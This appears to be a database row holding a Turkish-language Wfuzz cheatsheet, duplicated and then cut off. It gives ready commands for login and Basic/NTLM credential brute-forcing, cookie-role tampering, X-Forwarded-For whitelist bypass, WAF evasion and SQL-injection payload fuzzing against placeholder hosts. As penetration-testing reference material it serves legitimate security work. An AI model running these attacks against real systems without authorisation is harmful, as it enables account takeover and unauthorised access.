614	Wfuzz Cheatsheet	Wfuzz Cheatsheet	# Wfuzz - Web Application Fuzzer\n\n## Temel Kullanım\n\n**Basit directory fuzzing:**\n```\nwfuzz -c -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**GET parametre fuzzing:**\n```\nwfuzz -c -z file,params.txt http://target.com/page.php?id=FUZZ\n```\n\n**POST data fuzzing:**\n```\nwfuzz -c -z file,wordlist.txt -d "username=admin&password=FUZZ" http://target.com/login.php\n```\n\n**Subdomain fuzzing:**\n```\nwfuzz -c -z file,subdomains.txt -H "Host: FUZZ.target.com" http://target.com\n```\n\n## İleri Seviye Kullanım\n\n### GET ve POST Parametre Brute-Force\n\n**Multiple GET parametreleri:**\n```\nwfuzz -c -z file,users.txt -z file,passwords.txt http://target.com/login?user=FUZZ&pass=FUZ2Z\n```\n*FUZZ: 1. wordlist, FUZ2Z: 2. wordlist*\n\n**POST body fuzzing:**\n```\nwfuzz -c -z file,payloads.txt -d "username=admin&password=FUZZ" http://target.com/api/login\n```\n\n**JSON POST fuzzing:**\n```\nwfuzz -c -z file,values.txt -H "Content-Type: application/json" -d '{"user":"admin","pass":"FUZZ"}' http://target.com/api/auth\n```\n\n### Header Brute-Force\n\n**User-Agent fuzzing:**\n```\nwfuzz -c -z file,user-agents.txt -H "User-Agent: FUZZ" http://target.com/admin\n```\n\n**Custom header fuzzing:**\n```\nwfuzz -c -z file,tokens.txt -H "Authorization: Bearer FUZZ" http://target.com/api/endpoint\n```\n\n**X-Forwarded-For bypass:**\n```\nwfuzz -c -z file,ips.txt -H "X-Forwarded-For: FUZZ" http://target.com/admin\n```\n\n### Cookie Brute-Force\n\n**Session ID fuzzing:**\n```\nwfuzz -c -z file,session-ids.txt -b "PHPSESSID=FUZZ" http://target.com/dashboard\n```\n\n**Multiple cookie fuzzing:**\n```\nwfuzz -c -z file,values.txt -b "user=admin; role=FUZZ" http://target.com/panel\n```\n\n### Auth Bypass Teknikleri\n\n**HTTP Basic Auth:**\n```\nwfuzz -c -z file,users.txt -z file,passwords.txt --basic FUZZ:FUZ2Z http://target.com/secure\n```\n\n**NTLM Auth:**\n```\nwfuzz -c -z file,passwords.txt --ntlm "domain\\user:FUZZ" http://target.com/\n```\n\n**Custom auth header:**\n```\nwfuzz -c -z file,tokens.txt -H "X-API-Key: FUZZ" http://api.target.com/admin\n```\n\n### Çoklu Payload Yerleştirme\n\n**URL + Header fuzzing:**\n```\nwfuzz -c -z file,dirs.txt -z file,values.txt -H "X-Custom: FUZ2Z" http://target.com/FUZZ\n```\n\n**Path + GET parameter:**\n```\nwfuzz -c -z file,paths.txt -z file,ids.txt http://target.com/FUZZ?id=FUZ2Z\n```\n\n**Triple fuzzing:**\n```\nwfuzz -c -z file,w1.txt -z file,w2.txt -z file,w3.txt http://target.com/FUZZ/FUZ2Z?param=FUZ3Z\n```\n\n### Proxy ile Fuzzing\n\n**HTTP proxy (Burp):**\n```\nwfuzz -c -z file,wordlist.txt -p 127.0.0.1:8080:HTTP http://target.com/FUZZ\n```\n\n**SOCKS proxy:**\n```\nwfuzz -c -z file,wordlist.txt -p 127.0.0.1:9050:SOCKS5 http://target.com/FUZZ\n```\n\n### Rate-Limit Kontrollü Fuzzing\n\n**Thread limitleme:**\n```\nwfuzz -c -z file,wordlist.txt -t 5 http://target.com/FUZZ\n```\n\n**Request delay:**\n```\nwfuzz -c -z file,wordlist.txt -s 2 http://target.com/FUZZ\n```\n*Her istek arasında 2 saniye bekler*\n\n### WAF Bypass Taktikleri\n\n**Encoding kombinasyonu:**\n```\nwfuzz -c -z file,payloads.txt --prefilter "urlencode" http://target.com/search?q=FUZZ\n```\n\n**User-Agent rotation:**\n```\nwfuzz -c -z file,endpoints.txt -z file,user-agents.txt -H "User-Agent: FUZ2Z" http://target.com/FUZZ\n```\n\n**Slow fuzzing:**\n```\nwfuzz -c -z file,wordlist.txt -t 3 -s 3 http://waf-protected.com/FUZZ\n```\n\n### Custom Wordlist Kullanımı\n\n**File wordlist:**\n```\nwfuzz -c -z file,/path/to/wordlist.txt http://target.com/FUZZ\n```\n\n**Range generator:**\n```\nwfuzz -c -z range,1-1000 http://target.com/user?id=FUZZ\n```\n\n**List payload:**\n```\nwfuzz -c -z list,admin-root-test http://target.com/FUZZ\n```\n\n### Output Filtreleme\n\n**Hide status codes:**\n```\nwfuzz -c -z file,wordlist.txt --hc 404,403 http://target.com/FUZZ\n```\n\n**Hide line count:**\n```\nwfuzz -c -z file,wordlist.txt --hl 0 http://target.com/FUZZ\n```\n\n**Hide response size:**\n```\nwfuzz -c -z file,wordlist.txt --hh 5555 http://target.com/FUZZ\n```\n\n**Show only specific codes:**\n```\nwfuzz -c -z file,wordlist.txt --sc 200,301,302 http://target.com/FUZZ\n```\n\n**Show specific word count:**\n```\nwfuzz -c -z file,wordlist.txt --sw 100 http://target.com/FUZZ\n```\n\n### Çoklu Wordlist Kombinasyonu\n\n**Product mode (cartesian):**\n```\nwfuzz -c -z file,users.txt -z file,passwords.txt -m zip http://target.com/login?u=FUZZ&p=FUZ2Z\n```\n\n**Chain mode:**\n```\nwfuzz -c -z file,w1.txt -z file,w2.txt -m chain http://target.com/FUZZ\n```\n\n### Encoding Seçenekleri\n\n**URL encoding:**\n```\nwfuzz -c -z file,payloads.txt --prefilter "urlencode" http://target.com/search?q=FUZZ\n```\n\n**Base64 encoding:**\n```\nwfuzz -c -z file,values.txt --prefilter "base64" http://target.com/api?data=FUZZ\n```\n\n**Double URL encoding:**\n```\nwfuzz -c -z file,payloads.txt --prefilter "urlencode,urlencode" http://target.com/?param=FUZZ\n```\n\n### Recursion Fuzzing\n\n**Recursive directory scan:**\n```\nwfuzz -c -z file,wordlist.txt -R 2 http://target.com/FUZZ\n```\n*2 seviye derinliğe kadar recursive tara*\n\n## Argument Referansı\n\n### Temel Argümanlar\n\n**`-c`**\n*Renkli çıktı.*\n```\nwfuzz -c -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-z <type,source>`**\n*Payload kaynağını belirtir (file, range, list, etc.).*\n```\nwfuzz -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-u <URL>`**\n*Hedef URL (alternatif: URL direkt yazılabilir).*\n```\nwfuzz -u http://target.com/FUZZ -z file,wordlist.txt\n```\n\n**`-d <data>`**\n*POST data gönderir.*\n```\nwfuzz -d "user=admin&pass=FUZZ" -z file,passwords.txt http://target.com/login\n```\n\n**`-H <header>`**\n*Custom HTTP header ekler.*\n```\nwfuzz -H "Authorization: Bearer TOKEN" -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-b <cookie>`**\n*Cookie gönderir.*\n```\nwfuzz -b "session=abc123" -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-t <threads>`**\n*Thread sayısını belirler (default: 10).*\n```\nwfuzz -t 20 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-s <seconds>`**\n*İstekler arasında delay (saniye).*\n```\nwfuzz -s 1 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-p <proxy>`**\n*Proxy server kullanır (IP:PORT:TYPE).*\n```\nwfuzz -p 127.0.0.1:8080:HTTP -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--hc <codes>`**\n*Belirtilen HTTP status kodlarını gizler.*\n```\nwfuzz --hc 404,403 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--hl <lines>`**\n*Belirtilen satır sayısını gizler.*\n```\nwfuzz --hl 0 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--hh <chars>`**\n*Belirtilen karakter sayısını (response size) gizler.*\n```\nwfuzz --hh 5555 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--hw <words>`**\n*Belirtilen kelime sayısını gizler.*\n```\nwfuzz --hw 100 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--sc <codes>`**\n*Sadece belirtilen status kodlarını gösterir.*\n```\nwfuzz --sc 200,301,302 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--sl <lines>`**\n*Sadece belirtilen satır sayısını gösterir.*\n```\nwfuzz --sl 50 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--sh <chars>`**\n*Sadece belirtilen response size'ı gösterir.*\n```\nwfuzz --sh 1234 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--sw <words>`**\n*Sadece belirtilen kelime sayısını gösterir.*\n```\nwfuzz --sw 75 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-R <depth>`**\n*Recursive fuzzing derinliği.*\n```\nwfuzz -R 2 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-m <mode>`**\n*Çoklu payload modu (zip, chain, product).*\n```\nwfuzz -m zip -z file,w1.txt -z file,w2.txt http://target.com/FUZZ/FUZ2Z\n```\n\n**`--follow`**\n*HTTP redirect'leri takip eder.*\n```\nwfuzz --follow -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--basic <user:pass>`**\n*HTTP Basic Authentication.*\n```\nwfuzz --basic admin:FUZZ -z file,passwords.txt http://target.com/\n```\n\n**`--ntlm <domain\\user:pass>`**\n*NTLM Authentication.*\n```\nwfuzz --ntlm "domain\\user:FUZZ" -z file,passwords.txt http://target.com/\n```\n\n**`--prefilter <filter>`**\n*Payload'a encoding/filter uygular.*\n```\nwfuzz --prefilter "urlencode" -z file,payloads.txt http://target.com/?q=FUZZ\n```\n\n**`-V`**\n*Verbose mode (detaylı çıktı).*\n```\nwfuzz -V -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-o <format>`**\n*Output formatı (json, html, csv).*\n```\nwfuzz -o json -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-f <filename>`**\n*Sonuçları dosyaya kaydet.*\n```\nwfuzz -f results.txt -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`--filter <expression>`**\n*Advanced filtering.*\n```\nwfuzz --filter "c=200 and l>100" -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-X <method>`**\n*HTTP metodu belirt (GET, POST, PUT, DELETE, etc.).*\n```\nwfuzz -X POST -d "data=FUZZ" -z file,wordlist.txt http://target.com/api\n```\n\n## Açıklamalı Komutlar\n\n**Directory brute-force (temel):**\n```\nwfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 http://target.com/FUZZ\n```\n*-c: Renkli çıktı, -z: Wordlist source, --hc: 404'leri gizle, FUZZ: Payload yerleştirme noktası*\n\n**GET parametre fuzzing:**\n```\nwfuzz -c -z file,params.txt --hc 404,403 --hl 0 http://target.com/search?q=FUZZ\n```\n*--hl: 0 satırlı yanıtları gizle (boş response)*\n\n**POST login brute-force:**\n```\nwfuzz -c -z file,usernames.txt -z file,passwords.txt -d "username=FUZZ&password=FUZ2Z" --hc 200 --sc 302 http://target.com/login\n```\n*FUZZ/FUZ2Z: Çoklu payload, --hc: 200 gizle, --sc: Sadece 302 göster (redirect = başarılı login)*\n\n**Header injection:**\n```\nwfuzz -c -z file,payloads.txt -H "X-Forwarded-For: FUZZ" --sc 200 http://target.com/admin\n```\n*-H: Custom header, X-Forwarded-For: IP bypass için*\n\n**Cookie fuzzing:**\n```\nwfuzz -c -z range,0-1000 -b "user_id=FUZZ" --sc 200 --hh 5432 http://target.com/profile\n```\n*-z range: 0-1000 arası sayı, -b: Cookie, --hh: Belirli response size'ı gizle*\n\n**JSON API fuzzing:**\n```\nwfuzz -c -z file,ids.txt -H "Content-Type: application/json" -d '{"id":FUZZ}' --sc 200 http://target.com/api/user\n```\n*JSON body'de fuzzing, Content-Type header gerekli*\n\n**Subdomain brute-force:**\n```\nwfuzz -c -z file,subdomains.txt -H "Host: FUZZ.target.com" --hc 404,400 http://target.com\n```\n*Host header manipulation, wildcard detection için --hc kullan*\n\n**Proxy ile fuzzing:**\n```\nwfuzz -c -z file,wordlist.txt -p 127.0.0.1:8080:HTTP --hc 404 http://target.com/FUZZ\n```\n*-p: Burp proxy, tüm trafik Burp'ten geçer*\n\n**Multiple extension fuzzing:**\n```\nwfuzz -c -z file,filenames.txt -z list,php-txt-html-jsp http://target.com/FUZZ.FUZ2Z\n```\n*İki payload: filename + extension*\n\n**Auth bypass (Basic):**\n```\nwfuzz -c -z file,passwords.txt --basic admin:FUZZ --sc 200 http://target.com/secure\n```\n*HTTP Basic Auth brute-force*\n\n**Filtered fuzzing (advanced):**\n```\nwfuzz -c -z file,wordlist.txt --filter "c=200 and l>50 and w<100" http://target.com/FUZZ\n```\n*c=status code, l=lines, w=words; Complex filtering*\n\n**Recursive directory scan:**\n```\nwfuzz -c -z file,dirs.txt -R 3 --hc 404 http://target.com/FUZZ\n```\n*-R 3: 3 seviye derinliğe kadar recursive*\n\n**Rate-limited fuzzing:**\n```\nwfuzz -c -z file,wordlist.txt -t 5 -s 1 --hc 404,429 http://target.com/FUZZ\n```\n*-t 5: 5 thread, -s 1: 1 saniye delay, --hc 429: Rate-limit error'u gizle*\n\n**URL encoding fuzzing:**\n```\nwfuzz -c -z file,sqli-payloads.txt --prefilter "urlencode" --hc 404 http://target.com/search?q=FUZZ\n```\n*--prefilter: Payload'ları URL encode et*\n\n## Gerçek Pentest Senaryoları\n\n### Senaryo 1: Login Bypass - Parametre Fuzzing\n\n```\nwfuzz -c -z file,/usr/share/seclists/Usernames/top-usernames-shortlist.txt -z file,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -d "username=FUZZ&password=FUZ2Z&submit=Login" --hc 200 --sc 302 -t 20 http://target.com/login.php\n```\n*Başarılı login 302 redirect döner, başarısız 200 döner. --hc 200 ile failed login'leri gizle.*\n\n**Sonuç analizi:**\n```\n# Başarılı credential bulundu:\n000123:  302        0 L      0 W        0 Ch        "admin - password123"\n```\n\n### Senaryo 2: WAF Arkasında Endpoint Keşfi\n\n```\nwfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)" -H "X-Forwarded-For: 127.0.0.1" -t 10 -s 1 --hc 404,403 http://waf-protected.com/FUZZ\n```\n*Yavaş tarama (-t 10, -s 1), GoogleBot UA, X-Forwarded-For bypass*\n\n### Senaryo 3: API Endpoint Brute-Force\n\n```\nwfuzz -c -z file,api-endpoints.txt -z range,1-1000 -H "Authorization: Bearer eyJhbGc..." -H "Content-Type: application/json" --sc 200,201 http://api.target.com/v1/FUZZ/FUZ2Z\n```\n*REST API path + ID fuzzing, JWT authentication*\n\n**Örnek bulgu:**\n```\n000045:  200        15 L     45 W       823 Ch      "users - 42"\n```\n\n### Senaryo 4: Header-Based Auth Bypass (X-Forwarded-For)\n\n```\nwfuzz -c -z file,ips.txt -H "X-Forwarded-For: FUZZ" -H "X-Real-IP: FUZZ" --sc 200 --hc 403 http://target.com/admin\n```\n*IP whitelist bypass, localhost/internal IP fuzzing*\n\n**IP wordlist örneği:**\n```\n127.0.0.1\nlocalhost\n::1\n192.168.1.1\n10.0.0.1\n```\n\n### Senaryo 5: Cookie Manipülasyonu\n\n```\nwfuzz -c -z list,admin-moderator-user-guest -b "role=FUZZ; session=valid_token_here" --sc 200 --hh 1234 http://target.com/panel\n```\n*Role-based access control bypass, cookie değeri fuzzing*\n\n### Senaryo 6: POST/JSON Body Fuzzing\n\n```\nwfuzz -c -z file,sqli-payloads.txt -H "Content-Type: application/json" -d '{"search":"FUZZ","limit":10}' --hc 400,500 --filter "c=200 and l>100" http://target.com/api/search\n```\n*JSON body'de SQL injection, error-based filtering*\n\n### Senaryo 7: Büyük Wordlist - Performance Tuning\n\n```\nwfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 50 --hc 404 --hh 5555 -o json -f massive-scan.json http://target.com/FUZZ\n```\n*220k+ wordlist, 50 thread, JSON output, false-positive filtering*\n\n**Progress monitoring:**\n```\n# Terminal 2'de:\ntail -f massive-scan.json | grep -i "200"\n```\n\n### Senaryo 8: Vhost Brute-Force\n\n```\nwfuzz -c -z file,subdomains.txt -H "Host: FUZZ.target.com" --hc 404,400 --hw 100 --follow http://target.ip.address/\n```\n*Virtual host discovery, wildcard filtreleme*\n\n## Best Practices\n\n**1. Filtreleme Stratejileri:**\n\n**Baseline belirleme:**\n```\n# İlk test - geçersiz istek\ncurl -I http://target.com/nonexistent12345\n\n# Response: 404, 1234 bytes, 50 lines\n# Wfuzz filtreleme:\nwfuzz --hc 404 --hh 1234 --hl 50 ...\n```\n\n**Adaptive filtering:**\n```\n# İlk 10 sonuca bak\nwfuzz -c -z file,wordlist.txt http://target.com/FUZZ | head -20\n\n# Pattern belirle, sonra filtrele\nwfuzz -c -z file,wordlist.txt --hh 5555 --hl 42 http://target.com/FUZZ\n```\n\n**2. Yanlış Pozitif Azaltma:**\n\n**Wildcard detection:**\n```\n# Test isteği\ncurl http://target.com/definitelynonexistent12345678\n\n# Eğer 200 dönüyorsa wildcard var\n# Response size'a göre filtrele:\nwfuzz --hc 200 --hh <wildcard_size> ...\n```\n\n**Multiple filtering:**\n```\nwfuzz -c -z file,wordlist.txt --hc 404,403 --hl 0 --hw 50-60 http://target.com/FUZZ\n```\n\n**3. Hız/Performance Tuning:**\n\n**Thread optimizasyonu:**\n- Küçük wordlist (<1k): `-t 10-20`\n- Orta wordlist (1k-10k): `-t 20-30`\n- Büyük wordlist (>10k): `-t 30-50`\n- Rate-limited: `-t 5` + `-s 1`\n\n**Delay stratejisi:**\n```\n# WAF detection varsa\nwfuzz -t 5 -s 2 ...\n\n# Normal tarama\nwfuzz -t 30 ...\n```\n\n**4. Blind Endpoint Tespiti:**\n\n**Time-based detection:**\n```\nwfuzz -c -z file,payloads.txt --filter "t>5000" http://target.com/?q=FUZZ\n```\n*Response time > 5 saniye olanları göster (blind SQL/XXE)*\n\n**Response size anomaly:**\n```\nwfuzz -c -z file,wordlist.txt --filter "c=200 and (h<1000 or h>10000)" http://target.com/FUZZ\n```\n*Anormal response size'lar (çok küçük veya çok büyük)*\n\n**5. Payload Çeşitliliği:**\n\n**Multiple wordlist combo:**\n```\n# Özel + genel wordlist\ncat custom-endpoints.txt /usr/share/seclists/Discovery/Web-Content/common.txt > combined.txt\nwfuzz -z file,combined.txt http://target.com/FUZZ\n```\n\n**Payload transformation:**\n```\n# Case variations\nwfuzz -z file,words.txt --prefilter "upper" http://target.com/FUZZ\nwfuzz -z file,words.txt --prefilter "lower" http://target.com/FUZZ\n```\n\n**6. Output Management:**\n\n**Structured output:**\n```\nwfuzz -c -z file,wordlist.txt -o json -f results-$(date +%Y%m%d_%H%M).json http://target.com/FUZZ\n```\n\n**Real-time monitoring:**\n```\nwfuzz -c -z file,big-wordlist.txt http://target.com/FUZZ | tee live-results.txt\n```\n\n**7. Proxy Integration:**\n\n```\n# Tüm istekler Burp'ten geç\nwfuzz -c -z file,wordlist.txt -p 127.0.0.1:8080:HTTP http://target.com/FUZZ\n```\n\n**8. Multi-Stage Fuzzing:**\n\n```\n# Stage 1: Directory discovery\nwfuzz -c -z file,dirs.txt --hc 404 -o json -f dirs.json http://target.com/FUZZ\n\n# Stage 2: File fuzzing bulunan dizinlerde\ncat dirs.json | jq -r '.[] | select(.code==200) | .url' | while read dir; do\n  wfuzz -c -z file,files.txt --hc 404 $dir/FUZZ\ndone\n```\n\n## Sık Yapılan Hatalar\n\n**1. FUZZ marker eksikliği:**\n```\n# YANLIŞ\nwfuzz -c -z file,wordlist.txt http://target.com/admin\n\n# DOĞRU\nwfuzz -c -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**2. Filtreleme yapmamak:**\n```\n# YANLIŞ (çok fazla noise)\nwfuzz -c -z file,wordlist.txt http://target.com/FUZZ\n\n# DOĞRU\nwfuzz -c -z file,wordlist.txt --hc 404,403 --hl 0 http://target.com/FUZZ\n```\n\n**3. Wildcard kontrolü yapmamak:**\n```\n# Test et\ncurl http://target.com/sdfgsdfgsdfg123456\n# Eğer 200 dönüyorsa wildcard var, --hh ile filtrele\n```\n\n**4. Thread aşırı kullanımı:**\n```\n# YANLIŞ (connection error, rate-limit)\nwfuzz -t 100 -z file,wordlist.txt http://target.com/FUZZ\n\n# DOĞRU\nwfuzz -t 20-30 -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**5. POST data syntax hatası:**\n```\n# YANLIŞ\nwfuzz -d username=admin&password=FUZZ ...\n\n# DOĞRU (quotes kullan)\nwfuzz -d "username=admin&password=FUZZ" ...\n```\n\n**6. Multiple payload marker hatası:**\n```\n# YANLIŞ (2. payload için yanlış marker)\nwfuzz -z file,w1.txt -z file,w2.txt http://target.com/FUZZ/FUZZ\n\n# DOĞRU\nwfuzz -z file,w1.txt -z file,w2.txt http://target.com/FUZZ/FUZ2Z\n```\n\n**7. Header syntax hatası:**\n```\n# YANLIŞ\nwfuzz -H Authorization: Bearer TOKEN ...\n\n# DOĞRU\nwfuzz -H "Authorization: Bearer TOKEN" ...\n```\n\n**8. Output path izni:**\n```\n# YANLIŞ (permission denied)\nwfuzz -f /root/results.txt ...\n\n# DOĞRU\nwfuzz -f ~/results.txt ...\n```\n\n**9. Encoding unutmak:**\n```\n# YANLIŞ (SQLi payload'lar ham gönderilir)\nwfuzz -z file,sqli.txt http://target.com/?q=FUZZ\n\n# DOĞRU (URL encode)\nwfuzz -z file,sqli.txt --prefilter "urlencode" http://target.com/?q=FUZZ\n```\n\n**10. Baseline test yapmamak:**\n```\n# Her zaman önce test et:\ncurl -I http://target.com/definitelynonexistent\n# Response size, status code, line count'u not et\n# Sonra wfuzz'da filtrele\n```\n\n## Payload Types (-z seçenekleri)\n\n**file** - Dosyadan wordlist\n```\nwfuzz -z file,/path/wordlist.txt http://target.com/FUZZ\n```\n\n**list** - Inline list (virgülle ayrılmış)\n```\nwfuzz -z list,admin-root-test http://target.com/FUZZ\n```\n\n**range** - Sayı aralığı\n```\nwfuzz -z range,1-1000 http://target.com/user?id=FUZZ\n```\n\n**hexrange** - Hex aralığı\n```\nwfuzz -z hexrange,0x00-0xFF http://target.com/?param=FUZZ\n```\n\n**stdin** - STDIN'den al\n```\ncat wordlist.txt | wfuzz -z stdin http://target.com/FUZZ\n```\n\n**dirwalk** - Directory tree walk\n```\nwfuzz -z dirwalk,/path/to/dir http://target.com/FUZZ\n```\n\n## Filter Expressions\n\n**Status code:**\n```\n--filter "c=200"\n--filter "c!=404"\n--filter "c>=200 and c<300"\n```\n\n**Lines:**\n```\n--filter "l>50"\n--filter "l<100"\n```\n\n**Words:**\n```\n--filter "w=75"\n```\n\n**Chars (response size):**\n```\n--filter "h>1000"\n--filter "h!=5555"\n```\n\n**Time:**\n```\n--filter "t>5000"  # Response time > 5 sec\n```\n\n**Combination:**\n```\n--filter "c=200 and l>100 and h<10000"\n```\n\n## İpuçları\n\n**Wordlist konumları (Kali):**\n```\n/usr/share/seclists/Discovery/Web-Content/\n/usr/share/wordlists/dirb/\n/usr/share/wordlists/dirbuster/\n```\n\n**Output formatları:**\n```\n-o json    # JSON çıktı\n-o html    # HTML rapor\n-o csv     # CSV format\n-o raw     # Ham output\n```\n\n**Hızlı snippet'ler:**\n```\n# API key brute-force\nwfuzz -z file,keys.txt -H "X-API-Key: FUZZ" --sc 200 http://api.target.com/endpoint\n\n# User enumeration\nwfuzz -z file,users.txt -d "username=FUZZ" --hc 200 --sc 404 http://target.com/check-user\n\n# Backup file hunting\nwfuzz -z file,filenames.txt -z list,.bak-.old-.swp-.save http://target.com/FUZZ.FUZ2Z\n```\n	# Wfuzz - Web Application Fuzzer\n\n## Temel Kullanım\n\n**Basit directory fuzzing:**\n```\nwfuzz -c -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**GET parametre fuzzing:**\n```\nwfuzz -c -z file,params.txt http://target.com/page.php?id=FUZZ\n```\n\n**POST data fuzzing:**\n```\nwfuzz -c -z file,wordlist.txt -d "username=admin&password=FUZZ" http://target.com/login.php\n```\n\n**Subdomain fuzzing:**\n```\nwfuzz -c -z file,subdomains.txt -H "Host: FUZZ.target.com" http://target.com\n```\n\n## İleri Seviye Kullanım\n\n### GET ve POST Parametre Brute-Force\n\n**Multiple GET parametreleri:**\n```\nwfuzz -c -z file,users.txt -z file,passwords.txt http://target.com/login?user=FUZZ&pass=FUZ2Z\n```\n*FUZZ: 1. wordlist, FUZ2Z: 2. wordlist*\n\n**POST body fuzzing:**\n```\nwfuzz -c -z file,payloads.txt -d "username=admin&password=FUZZ" http://target.com/api/login\n```\n\n**JSON POST fuzzing:**\n```\nwfuzz -c -z file,values.txt -H "Content-Type: application/json" -d '{"user":"admin","pass":"FUZZ"}' http://target.com/api/auth\n```\n\n### Header Brute-Force\n\n**User-Agent fuzzing:**\n```\nwfuzz -c -z file,user-agents.txt -H "User-Agent: FUZZ" http://target.com/admin\n```\n\n**Custom header fuzzing:**\n```\nwfuzz -c -z file,tokens.txt -H "Authorization: Bearer FUZZ" http://target.com/api/endpoint\n```\n\n**X-Forwarded-For bypass:**\n```\nwfuzz -c -z file,ips.txt -H "X-Forwarded-For: FUZZ" http://target.com/admin\n```\n\n### Cookie Brute-Force\n\n**Session ID fuzzing:**\n```\nwfuzz -c -z file,session-ids.txt -b "PHPSESSID=FUZZ" http://target.com/dashboard\n```\n\n**Multiple cookie fuzzing:**\n```\nwfuzz -c -z file,values.txt -b "user=admin; role=FUZZ" http://target.com/panel\n```\n\n### Auth Bypass Teknikleri\n\n**HTTP Basic Auth:**\n```\nwfuzz -c -z file,users.txt -z file,passwords.txt --basic FUZZ:FUZ2Z http://target.com/secure\n```\n\n**NTLM Auth:**\n```\nwfuzz -c -z file,passwords.txt --ntlm "domain\\user:FUZZ" http://target.com/\n```\n\n**Custom auth header:**\n```\nwfuzz -c -z file,tokens.txt -H "X-API-Key: FUZZ" http://api.target.com/admin\n```\n\n### Çoklu Payload Yerleştirme\n\n**URL + Header fuzzing:**\n```\nwfuzz -c -z file,dirs.txt -z file,values.txt -H "X-Custom: FUZ2Z" http://target.com/FUZZ\n```\n\n**Path + GET parameter:**\n```\nwfuzz -c -z file,paths.txt -z file,ids.txt http://target.com/FUZZ?id=FUZ2Z\n```\n\n**Triple fuzzing:**\n```\nwfuzz -c -z file,w1.txt -z file,w2.txt -z file,w3.txt http://target.com/FUZZ/FUZ2Z?param=FUZ3Z\n```\n\n### Proxy ile Fuzzing\n\n**HTTP proxy (Burp):**\n```\nwfuzz -c -z file,wordlist.txt -p 127.0.0.1:8080:HTTP http://target.com/FUZZ\n```\n\n**SOCKS proxy:**\n```\nwfuzz -c -z file,wordlist.txt -p 127.0.0.1:9050:SOCKS5 http://target.com/FUZZ\n```\n\n### Rate-Limit Kontrollü Fuzzing\n\n**Thread limitleme:**\n```\nwfuzz -c -z file,wordlist.txt -t 5 http://target.com/FUZZ\n```\n\n**Request delay:**\n```\nwfuzz -c -z file,wordlist.txt -s 2 http://target.com/FUZZ\n```\n*Her istek arasında 2 saniye bekler*\n\n### WAF Bypass Taktikleri\n\n**Encoding kombinasyonu:**\n```\nwfuzz -c -z file,payloads.txt --prefilter "urlencode" http://target.com/search?q=FUZZ\n```\n\n**User-Agent rotation:**\n```\nwfuzz -c -z file,endpoints.txt -z file,user-agents.txt -H "User-Agent: FUZ2Z" http://target.com/FUZZ\n```\n\n**Slow fuzzing:**\n```\nwfuzz -c -z file,wordlist.txt -t 3 -s 3 http://waf-protected.com/FUZZ\n```\n\n### Custom Wordlist Kullanımı\n\n**File wordlist:**\n```\nwfuzz -c -z file,/path/to/wordlist.txt http://target.com/FUZZ\n```\n\n**Range generator:**\n```\nwfuzz -c -z range,1-1000 http://target.com/user?id=FUZZ\n```\n\n**List payload:**\n```\nwfuzz -c -z list,admin-root-test http://target.com/FUZZ\n```\n\n### Output Filtreleme\n\n**Hide status codes:**\n```\nwfuzz -c -z file,wordlist.txt --hc 404,403 http://target.com/FUZZ\n```\n\n**Hide line count:**\n```\nwfuzz -c -z file,wordlist.txt --hl 0 http://target.com/FUZZ\n```\n\n**Hide response size:**\n```\nwfuzz -c -z file,wordlist.txt --hh 5555 http://target.com/FUZZ\n```\n\n**Show only specific codes:**\n```\nwfuzz -c -z file,wordlist.txt --sc 200,301,302 http://target.com/FUZZ\n```\n\n**Show specific word count:**\n```\nwfuzz -c -z file,wordlist.txt --sw 100 http://target.com/FUZZ\n```\n\n### Çoklu Wordlist Kombinasyonu\n\n**Product mode (cartesian):**\n```\nwfuzz -c -z file,users.txt -z file,passwords.txt -m zip http://target.com/login?u=FUZZ&p=FUZ2Z\n```\n\n**Chain mode:**\n```\nwfuzz -c -z file,w1.txt -z file,w2.txt -m chain http://target.com/FUZZ\n```\n\n### Encoding Seçenekleri\n\n**URL encoding:**\n```\nwfuzz -c -z file,payloads.txt --prefilter "urlencode" http://target.com/search?q=FUZZ\n```\n\n**Base64 encoding:**\n```\nwfuzz -c -z file,values.txt --prefilter "base64" http://target.com/api?data=FUZZ\n```\n\n**Double URL encoding:**\n```\nwfuzz -c -z file,payloads.txt --prefilter "urlencode,urlencode" http://target.com/?param=FUZZ\n```\n\n### Recursion Fuzzing\n\n**Recursive directory scan:**\n```\nwfuzz -c -z file,wordlist.txt -R 2 http://target.com/FUZZ\n```\n*2 seviye derinliğe kadar recursive tara*\n\n## Argument Referansı\n\n### Temel Argümanlar\n\n**`-c`**\n*Renkli çıktı.*\n```\nwfuzz -c -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-z <type,source>`**\n*Payload kaynağını belirtir (file, range, list, etc.).*\n```\nwfuzz -z file,wordlist.txt http://target.com/FUZZ\n```\n\n**`-u <URL>`**\n*Hedef URL (alternatif: URL direkt yazılabilir).*\n```\nwfuzz -u http://target.com/FUZZ -z file,wordlist.txt\n```\n\n**`-d <data>`**\n*POST data 